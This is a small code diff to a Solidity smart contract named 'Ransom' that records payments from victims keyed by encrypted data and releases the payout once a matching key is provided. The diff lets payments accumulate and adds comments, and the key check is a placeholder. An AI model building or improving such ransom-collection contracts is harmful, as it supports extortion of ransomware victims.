@@ -4,6 +4,7 @@ contract Ransom {
     uint public demanded;
     address public sendTo;
 
+    // Maps (encrypted) data from victim to the amount the victim has paid
     mapping (int => uint) public ransoms;
 
     event RansomPaid(int data);
@@ -17,8 +18,9 @@ contract Ransom {
 
     function payRansom(int data) public payable returns (bool) {
         // TODO some kind of return function?
-        if (msg.value >= demanded) {
-            ransoms[data] = msg.value; //todo +=
+        // Allows multiple payments
+        ransoms[data] += msg.value;
+        if (ransoms[data] >= demanded) {
             RansomPaid(data);
         } else {
             return false;
@@ -26,7 +28,8 @@ contract Ransom {
     }
 
     function provideKey(int data, int key) public returns (bool){
-        if (data + key == 0) { // Needs to be more complicated function
+        // TODO more robust key checking function
+        if (data + key == 0) { // Check validity of key
             uint payout = ransoms[data]; // TODO 0 checks?
             ransoms[data] = 0;
             KeyGiven(data, key, payout);
